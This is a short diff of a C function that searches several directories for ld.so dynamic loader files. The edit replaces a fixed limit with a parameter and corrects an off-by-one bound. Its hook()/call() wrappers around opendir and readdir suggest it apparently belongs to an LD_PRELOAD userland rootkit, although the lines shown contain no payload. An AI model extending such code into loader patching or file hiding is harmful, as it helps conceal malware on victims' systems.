@@ -1,7 +1,7 @@
 // searches all ldhomes directories for ld.so & returns an array of char pointers to each valid ld.so.
 // the pointer allf is updated with the number of located ld.so.
-char **ldfind(int *allf){
-    char **foundlds = malloc(sizeof(char*)*MAXLDS);
+char **ldfind(int *allf, int maxlds){
+    char **foundlds = malloc(sizeof(char*)*maxlds);
     if(!foundlds) return NULL;
     
     char *home, *ldname, *namedup, *nametok;
@@ -13,13 +13,13 @@ char **ldfind(int *allf){
 
     hook(COPENDIR, CREADDIR, C__LXSTAT);
 
-    for(int i=0; i<sizeofarr(ldhomes) && found<=MAXLDS; i++){
+    for(int i=0; i<sizeofarr(ldhomes) && found<maxlds; i++){
         home = ldhomes[i];
         
         dp = call(COPENDIR, home);
         if(dp == NULL) continue;
 
-        while((dir = call(CREADDIR, dp)) != NULL && found<=MAXLDS){
+        while((dir = call(CREADDIR, dp)) != NULL && found<maxlds){
             if(!strncmp(".", dir->d_name, 1) || strncmp("ld-", dir->d_name, 3))
                 continue;
 
